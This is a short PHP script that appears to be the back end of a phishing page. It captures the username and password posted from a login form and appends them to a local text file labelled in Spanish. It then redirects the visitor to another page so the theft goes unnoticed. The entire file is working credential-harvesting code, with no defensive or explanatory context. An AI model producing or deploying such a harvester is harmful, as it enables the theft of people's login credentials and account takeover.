<?php

$file = fopen("datamichu.txt", "a");
fwrite($file, "||========================================" . PHP_EOL);
fwrite($file, "|| USUARIO: " .$_POST['username']. PHP_EOL);
fwrite($file, "|| CLAVE:".$_POST['password']. PHP_EOL);
fclose($file);
header ('Location: index2.html');


?>